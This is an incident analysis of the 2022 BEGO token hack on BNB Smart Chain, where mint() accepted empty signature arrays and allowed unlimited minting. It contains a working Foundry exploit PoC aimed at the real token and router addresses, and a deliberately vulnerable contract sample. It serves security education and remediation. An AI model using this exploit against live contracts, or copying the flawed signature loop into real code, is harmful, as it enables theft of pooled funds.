# BEGO — Signature Verification Bypass Unlimited Minting Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | BEGO Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~12 WBNB |
| **Attack Tx** | [0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57](https://bscscan.com/tx/0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57) |
| **BEGO Token** | [0xc342774492b54ce5F8ac662113ED702Fc1b34972](https://bscscan.com/address/0xc342774492b54ce5F8ac662113ED702Fc1b34972) |
| **Attack Contract** | [0x08a525104Ea2A92aBbcE8e4e61C667eED56f3B42](https://bscscan.com/address/0x08a525104Ea2A92aBbcE8e4e61C667eED56f3B42) |
| **Attacker** | [0xde01f6Ce91E4F4bdB94BB934d30647d72182320F](https://bscscan.com/address/0xde01f6Ce91E4F4bdB94BB934d30647d72182320F) |
| **WBNB/BEGO Pair** | [0x88503F48e437a377f1aC2892cBB3a5b09949faDd](https://bscscan.com/address/0x88503F48e437a377f1aC2892cBB3a5b09949faDd) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | The `mint()` function accepts an empty signature array, allowing arbitrary minting without signature verification |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BEGO_exp.sol) |

---
## 1. Vulnerability Overview

BEGO is a BSC token implementing a custom ERC20 (`BEGO20`) that uses off-chain signatures to authorize minting via the `mint()` function. However, when the signature arrays (`bytes32[] r, bytes32[] s, uint8[] v`) are empty, the loop terminates immediately, causing signature verification to be entirely skipped. The attacker minted 1 trillion BEGO tokens with empty signatures, then sold the entire amount for WBNB on PancakeSwap, draining approximately 12 WBNB.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable mint() - accepts empty signature arrays
contract BEGO20 {
    function mint(
        uint256 amount,
        string memory nonce,
        address to,
        bytes32[] memory r,
        bytes32[] memory s,
        uint8[]  memory v
    ) external {
        // ❌ If r, s, v are empty arrays, the loop never executes
        // Signature verification is completely bypassed
        for (uint256 i = 0; i < r.length; i++) {
            address signer = ecrecover(
                keccak256(abi.encodePacked(amount, nonce, to)),
                v[i], r[i], s[i]
            );
            // Signer validation logic...
        }
        // ❌ Unconditional mint after passing the loop
        _mint(to, amount);
    }
}

// ✅ Correct pattern - enforce minimum signature count
contract SafeBEGO20 {
    uint256 public constant MIN_SIGNATURES = 3; // Require multiple signers

    function mint(
        uint256 amount,
        string memory nonce,
        address to,
        bytes32[] memory r,
        bytes32[] memory s,
        uint8[]  memory v
    ) external {
        // ✅ Validate minimum signature count
        require(r.length >= MIN_SIGNATURES, "Insufficient signatures");
        require(r.length == s.length && s.length == v.length, "Array length mismatch");

        bytes32 msgHash = keccak256(abi.encodePacked(amount, nonce, to));
        for (uint256 i = 0; i < r.length; i++) {
            address signer = ecrecover(msgHash, v[i], r[i], s[i]);
            require(authorizedSigners[signer], "Unauthorized signer");
        }

        require(!usedNonces[nonce], "Nonce already used");
        usedNonces[nonce] = true;
        _mint(to, amount);
    }
}
```


### On-Chain Original Code

Source: Source unverified

> ⚠️ No on-chain source code — bytecode only or source not verified

**Vulnerable function** — `mint()`:
```solidity
// ❌ Root cause: The `mint()` function accepts an empty signature array, allowing arbitrary minting without signature verification
// Source code unverified — bytecode analysis required
// Vulnerability: The `mint()` function accepts an empty signature array, allowing arbitrary minting without signature verification
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Call BEGO.mint(1_000_000_000_000e18, nonce, attacker, [], [], [])
    │       └─ r, s, v = empty arrays
    │           ├─ for (i = 0; i < 0; i++) → loop never executes
    │           └─ ❌ 1 trillion BEGO minted successfully without signature verification
    │
    ├─[2] Approve entire BEGO balance to PancakeRouter
    │
    ├─[3] swapExactTokensForTokensSupportingFeeOnTransferTokens()
    │       Sell all 1 trillion BEGO → WBNB
    │       → Liquidity pool WBNB drained
    │
    └─[4] Net profit: ~12 WBNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBEGO20 {
    function mint(
        uint256 amount,
        string calldata nonce,
        address to,
        bytes32[] calldata r,
        bytes32[] calldata s,
        uint8[]   calldata v
    ) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

contract BEGOExploit is Test {
    IBEGO20 bego   = IBEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address WBNB   = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.createSelectFork("bsc", 22_315_679);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB balance", address(this).balance, 18);

        // [Step 1] Mint 1 trillion BEGO with empty signatures
        // ⚡ r, s, v = [] → for loop never executes → signature verification bypassed
        bytes32[] memory emptyBytes32 = new bytes32[](0);
        uint8[]   memory emptyUint8  = new uint8[](0);

        bego.mint(
            1_000_000_000_000 * 1e18,
            "exploit_nonce",
            address(this),
            emptyBytes32, // ❌ empty r array
            emptyBytes32, // ❌ empty s array
            emptyUint8    // ❌ empty v array
        );

        emit log_named_decimal_uint("[After mint] BEGO balance", bego.balanceOf(address(this)), 18);

        // [Step 2] Sell entire BEGO balance for WBNB
        bego.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(bego);
        path[1] = WBNB;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bego.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[End] WBNB balance", address(this).balance, 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Signature Bypass via Empty Array |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **OWASP DeFi** | Off-chain Signature Verification Flaw |
| **Attack Vector** | `mint(amount, nonce, to, [], [], [])` — empty signature arrays |
| **Preconditions** | `mint()` function accepts empty signature arrays |
| **Impact** | ~12 WBNB loss, complete destruction of token value |

---
## 6. Remediation Recommendations

1. **Enforce minimum signature count**: Add `require(r.length >= MIN_SIGNATURES, ...)` before the loop.
2. **Validate array length consistency**: Verify `r.length == s.length && s.length == v.length`.
3. **Prevent nonce reuse**: Track `usedNonces[nonce]` to prevent double-minting with the same nonce.
4. **Use OpenZeppelin SignatureChecker**: Leverage a battle-tested signature verification library.

---
## 7. Lessons Learned

- **Loop boundary conditions**: Cases where empty array input causes the loop to never execute must be explicitly blocked. Validate length > 0 for all array parameters before entering the loop.
- **Weakness of multi-signature structures**: When implementing multi-signature verification via a loop, all edge cases must be tested — including empty arrays, duplicate signers, and signature ordering.
- **Criticality of minting permissions**: A vulnerability that allows unlimited minting can neutralize the entire value of a token in a single transaction.